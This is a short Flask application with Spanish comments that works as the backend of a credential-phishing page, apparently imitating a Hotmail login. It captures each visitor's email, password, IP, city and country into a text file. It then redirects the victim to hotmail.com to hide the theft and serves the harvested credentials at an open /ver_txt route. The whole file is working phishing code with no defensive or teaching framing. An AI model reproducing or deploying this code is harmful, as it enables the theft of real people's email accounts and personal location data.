from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    # Obtener los datos del formulario
    input1 = request.form['input1']
    input2 = request.form['input2']
    ip = request.form['ip']
    ciudad =request.form['ciudad']
    pais = request.form['pais']
    # Obtener la IP del usuario

    # Escribir los datos en un archivo de texto junto con la IP
    with open('data.txt', 'a') as file:
        file.write(f'IP: {ip} Ciudad: {ciudad} Pais: {pais},  Correo: {input1}, Contra: {input2}\n')

    # Redirigir a otra página
    return redirect(url_for('success'))

@app.route('/ver_txt')
def ver_txt():
    # Leer el contenido del archivo de texto
    with open('data.txt', 'r') as file:
        contenido = file.read()

    # Mostrar el contenido en una página web
    return f'<pre>{contenido}</pre>'

@app.route('/success')
def success():
    return redirect('https://hotmail.com')


if __name__ == '__main__':
    app.run(debug=True)
